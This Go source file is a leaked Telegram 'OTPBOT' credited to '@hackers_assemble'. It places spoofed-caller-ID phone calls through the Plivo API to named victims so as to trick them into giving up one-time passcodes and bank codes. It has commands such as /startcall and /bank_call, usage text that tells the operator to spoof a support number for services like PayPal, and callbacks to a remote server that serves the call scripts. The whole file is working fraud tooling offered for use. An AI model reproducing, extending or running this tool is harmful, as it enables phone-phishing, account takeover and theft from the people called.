package main

import (
	"fmt"
	"log"
	//"os"
	//"strconv"
	"strings"
	"time"

	"github.com/plivo/plivo-go"
	tb "gopkg.in/tucnak/telebot.v2"
)

//#Configuration

var NGROK_URL string = "https://golandbotapi.herokuapp.com"
var BOT_TOKEN string = ""
var PLIVO_AUTH_ID string = ""
var PLIVO_AUTH_TOKEN string = ""
var OWNER_CHAT_ID int64 = 12345678

type teleinfo struct {
	UserID string
}

type originalmsg struct {
	msgid int
}

func main() {

	client, err := plivo.NewClient(PLIVO_AUTH_ID, PLIVO_AUTH_TOKEN, &plivo.ClientOptions{})

	if err != nil {
		panic(err)
	}

	//connecting to Telebot

	b, err := tb.NewBot(tb.Settings{
		Token: BOT_TOKEN,
		Poller: &tb.LongPoller{Timeout: 10 * time.Second},
	})

	if err != nil {
		log.Fatal(err)
		return
	}

	b.Handle("/start", func(m *tb.Message) {
		if m.Chat.ID != OWNER_CHAT_ID {
			return 
		}

		b.Send(m.Sender, "Hello World! The Bot Created By a Fucker Leaked By @hackers_assemble in Pure Go Lang [https://go.dev/] :)\n To Know My Basic Usage Click /howtouse and The Call Modes /callmodes\n\n@hackers_assemble")
	})

	b.Handle("/callmodes", func(m *tb.Message) {
		if !m.Private() {
			return
		}
		b.Send(m.Sender, "<b>List Of Call Modes: </b>"+"\n\n"+"<code>/bank_call - Used For Bank OTP's"+"\n"+"/startcall - Used For Anything That Asks For 6 Digit OTP </code>"+"\n\n@hackers_assemble", tb.ModeHTML)
	})

	b.Handle("/howtouse", func(m *tb.Message) {
		if !m.Private() {
			return
		}
		b.Send(m.Sender, "<b>Follow These Arguments"+"\n"+"/startcall VictimsNumber SpoofedNumber VictimsName Service"+"\n \n"+"Example: /startcall 14693017322 18443734961 Joe PayPal"+"\n"+"Spoofed Number allows you to spoof as any number (Spoof as a support number)</b>"+"\n\n@hackers_assemble", tb.ModeHTML)
	})

	b.Handle("/startcall", func(m *tb.Message) {
		if !m.Private() {
			return
		}

		if m.Chat.ID != OWNER_CHAT_ID {
			return 
		}

		data := strings.Split(m.Text, " ")
		if len(data) < 3 {
			b.Send(m.Sender, "<b>Follow These Arguments"+"\n"+"/startcall VictimsNumber SpoofedNumber VictimsName Service"+"\n \n"+"Example: /startcall 14693017322 18443734961 Joe PayPal</b>"+"\n\n@hackers_assemble", tb.ModeHTML)
			return
		}
		fmt.Println("[LOGS] [NEW CALL] From: " + data[2] + " To: " + data[1] + " Module: " + data[4] + "\n\n@hackers_assemble")
		b.Send(m.Sender, "<b>📱 Call Initiated"+"\n"+"Name: "+data[3]+"\n"+"Module: "+data[4]+"</b>"+"\n\n@hackers_assemble", tb.ModeHTML)
		/*
			data[1] - victim number
			data[2] - from number
			data[3] - victim name
			data[4] - service name
		*/
		mes, _ := b.Send(m.Sender, "🤳 Call Started\n\n@hackers_assemble")
		fmt.Println(fmt.Sprintf("%v/generate_xml/%v/%v/%v/%v", NGROK_URL, m.Chat.ID, data[3], data[4], mes.ID))
		fmt.Println(fmt.Sprintf("%v/hangup/%v/%v", NGROK_URL, m.Chat.ID, mes.ID))

		_, err := client.Calls.Create(
			plivo.CallCreateParams{
				From:         data[2], //from number
				To:           data[1], //to number
				AnswerURL:    fmt.Sprintf("%v/generate_xml/%v/%v/%v/%v", NGROK_URL, m.Chat.ID, data[3], data[4], mes.ID),
				AnswerMethod: "GET",
				TimeLimit:    60,
				//MachineDetection:    "true",
				//MachineDetectionUrl: fmt.Sprintf("%v/machine/%v/%v", NGROK_URL, m.Chat.ID, mes.ID),
				HangupURL: fmt.Sprintf("%v/hangup/%v/%v", NGROK_URL, m.Chat.ID, mes.ID),
				RingURL:   fmt.Sprintf("%v/ring/%v/%v", NGROK_URL, m.Chat.ID, mes.ID)}, //name
		)
		if err != nil {
			panic(err)
		}

	})


	b.Handle("/bank_call", func(m *tb.Message) {
		if !m.Private() {
			return
		}

		if m.Chat.ID != OWNER_CHAT_ID {
			return 
		}

		data := strings.Split(m.Text, " ")
		if len(data) < 3 {
			b.Send(m.Sender, "<b>Follow These Arguments"+"\n"+"/startcall VictimsNumber SpoofedNumber VictimsName Service"+"\n \n"+"Example: /startcall 14693017322 18443734961 Amy PayPal</b>"+"\n\n@hackers_assemble", tb.ModeHTML)
			return
		}
		fmt.Println("[LOGS] [NEW CALL] From: " + data[2] + " To: " + data[1] + " Module: " + data[4])
		b.Send(m.Sender, "<b>📱 Call Initiated"+"\n"+"Name: "+data[3]+"\n"+"Module: "+data[4]+"</b>", tb.ModeHTML)

		/*
			data[1] - victim number
			data[2] - from number
			data[3] - victim name
			data[4] - service name
		*/
		mes, _ := b.Send(m.Sender, "🤳 Call Started\n\n@hackers_assemble")

		_, err := client.Calls.Create(
			plivo.CallCreateParams{
				From:         data[2], //from number
				To:           data[1], //to number
				AnswerURL:    fmt.Sprintf("%v/generate_bank_xml/%v/%v/%v/%v", NGROK_URL, m.Chat.ID, data[3], data[4], mes.ID),
				AnswerMethod: "GET",
				TimeLimit:    60,
				//MachineDetection:    "true",
				//MachineDetectionUrl: fmt.Sprintf("%v/machine_bank/%v/%v", NGROK_URL, m.Chat.ID, mes.ID),
				HangupURL: fmt.Sprintf("%v/hangup_bank/%v/%v", NGROK_URL, m.Chat.ID, mes.ID),
				RingURL:   fmt.Sprintf("%v/ring_bank/%v/%v", NGROK_URL, m.Chat.ID, mes.ID)}, //name
		)
		if err != nil {
			panic(err)
		}
	})

	fmt.Println("OTPBOT: Bot Online\n\n@hackers_assemble")
	b.Start()// starting the bot
}
//Work Completed!